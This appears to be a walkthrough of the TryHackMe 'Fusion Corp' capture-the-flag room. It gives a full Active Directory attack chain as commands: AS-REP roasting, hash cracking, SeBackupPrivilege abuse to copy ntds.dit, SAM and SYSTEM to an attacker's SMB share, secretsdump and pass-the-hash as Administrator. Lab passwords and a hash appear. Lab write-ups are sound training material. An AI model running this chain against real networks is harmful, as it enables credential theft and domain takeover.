# Fusion Corp

<figure><img src="../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/room/fusioncorp" %}

***

Let's Scan The Services using `nmap` first !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo nmap 10.49.174.246 -sV -sC -Pn -T4 -A
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

There is lot of services is running let's check the website on the port 80 .

<figure><img src="../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

Then Check The hidden directory and i got a interesting one  `backup` directory !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
ffuf -u http://10.49.174.246/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

Then i download the `employees.ods` file and open in `libreoffice`&#x20;

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
libreoffice --calc employees.ods
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

Save All The name in The `names.txt` and Then use the `user-enumeration` Tool !

{% embed url="https://github.com/urbanadventurer/username-anarchy.git" %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
username-anarchy --input-file names.txt > usernames.txt
```
{% endcode %}

Then i use the kerbrute tool for the validate the usernames and we got the hash that means Kerberos pre-authentication is disabled and we can attack the AS-REP Roasting !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
kerbrute userenum -d fusion.corp --dc 10.49.174.246 usernames.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

Then i did the AS-REP Roasting !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-GetNPUsers fusion.corp/ -no-pass -usersfile usernames.txt -dc-ip 10.49.174.246
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

Then Crack The Hash Using john !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

validate the credential using `crackmapexec` !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
crackmapexec smb 10.49.174.246 -u 'lparker' -p '!!abbylvzsvs2k6!'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

Then i use `evil-winrm` to interact with shell !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
evil-winrm -i 10.49.174.246 -u 'lparker' -p '!!abbylvzsvs2k6!'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

Then check the username using `--users` flag in `crackmapexec` and i got a password in the comments !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
crackmapexec smb 10.48.139.33 -u 'lparker' -p '!!abbylvzsvs2k6!' --users
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

Then i use `evil-winrm` to interact with shell !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
evil-winrm -i 10.48.139.33 -u 'jmurphy' -p 'u8WC3!kLsgw=#bRY'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>

Check The Permission on the user  and got two dangerous Privileges `SeBackupPrivilege` and `SeRestorePrivilege`!

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
whoami /priv
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>

Exploit these privilege to dump the credentials !

Then create a file called `viper.dsh`&#x20;

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% X:
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

Then do this .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
unix2dos viper.dsh
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

Go in the `windows/tasks` directory !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
cd /windows/tasks
```
{% endcode %}

Upload The File in `evil-winrm`

<figure><img src="../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

Use The diskshadow !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
diskshadow /s viper.dsh
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

Then i use the `robocopy` !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
robocopy /b X:\Windows\NTDS . ntds.dit
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

Save The `SYSTEM` and `SAM` file in the current directory !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
reg save HKLM\SYSTEM C:\windows\tasks\system
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
reg save HKLM\SAM C:\windows\tasks\sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

Send The all three files in the `kali` machine !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-smbserver kali . -smb2support -username kali -password kali
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
net use \192.168.130.53\kali /user:kali kali
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
copy sam, system, ntds.dit \192.168.130.53\kali
```
{% endcode %}

Dump The `ntds.dit` and got the hashes of the administrator !!

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```
{% endcode %}

Pass the hash attack !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
evil-winrm -i 10.48.139.33 -u 'Administrator' -H 9653b02d945329c7270525c4c2a69c67
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>
